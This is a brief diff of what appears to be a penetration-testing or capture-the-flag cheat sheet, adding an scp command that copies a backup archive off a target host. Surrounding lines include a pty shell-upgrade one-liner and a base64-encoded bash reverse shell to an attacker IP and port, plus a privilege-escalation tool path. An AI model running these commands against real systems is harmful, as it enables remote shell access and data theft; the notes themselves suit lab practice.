@@ -22,6 +22,9 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 base64
 echo -n 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1' | base64 
 
+## SCP
+scp user@10.10.11.74:/var/backup/backup.tar.gz .
+
 ## leanpeas path
 cd /usr/share/peass/
 ## From public github
